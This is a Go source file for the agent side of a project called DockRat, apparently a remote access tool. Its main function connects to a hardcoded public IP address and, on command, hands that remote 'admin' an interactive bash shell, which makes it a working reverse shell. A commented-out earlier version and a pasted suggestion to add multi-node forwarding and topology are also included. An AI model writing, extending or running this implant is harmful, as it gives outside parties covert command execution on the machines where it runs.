// === /cmd/agent/main.go ===
// === file info ===
// agent 行为：
// 启动时运行一个 bash 或 cmd.exe

// 通过 cmd.StdinPipe() 和 cmd.StdoutPipe() 与之交互

// 将每条 admin 发来的命令写入 shell 的标准输入

// 将结果（stdout/stderr）返回给 admin
package main

import (
	"bufio"
	"fmt"
	"net"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/shell"
)

// func main() {
// 	conn, err := net.Dial("tcp", "127.0.0.1:9999")
// 	if err != nil {
// 		fmt.Println("Connect error:", err)
// 		return
// 	}
// 	defer conn.Close()

// 	session, err := shell.StartSession("bash") // or cmd.exe on Windows
// 	if err != nil {
// 		fmt.Println("Shell start error:", err)
// 		return
// 	}

// 	dispatcher := protocol.NewDispatcher()

// 	dispatcher.Register("exec", func(msg protocol.Message) error {
// 		output, err := session.Exec(msg.Data)
// 		if err != nil {
// 			output = "[ERROR] " + err.Error()
// 		}
// 		resp, _ := protocol.Encode(protocol.Message{
// 			Type: "result",
// 			Data: output,
// 		})
// 		conn.Write(append(resp, '\n'))
// 		return nil
// 	})

// 	dispatcher.Register("exit", func(msg protocol.Message) error {
// 		conn.Close()
// 		os.Exit(0)
// 		return nil
// 	})

// 	fmt.Println("[*] Agent ready.")
// 	_ = dispatcher.Listen(conn)
// }

//TODO:🚀 下一步推荐
// 你现在已经完成：

// 持久连接

// 协议调度

// 协议驱动的行为（shell/exit）

// ✅ 接下来你可以考虑：

// 增加 node ID 结构，支持 use/select 控制多个节点

// 添加 forward/backward 转发命令支持

// 建立 topo 结构，维护多级拓扑

// 是否需要我继续为你添加 节点结构 和 多级转发 的逻辑基础？

func main() {
	conn, err := net.Dial("tcp", "45.89.233.225:9999")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Connected to admin.")

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		msg, err := protocol.Decode(scanner.Bytes())
		if err != nil {
			continue
		}
		if msg.Type == "cmd" {
			fmt.Println("[*] Launching interactive shell...")
			_ = shell.StartShellIO(conn, "bash")
			break
		}
	}
}
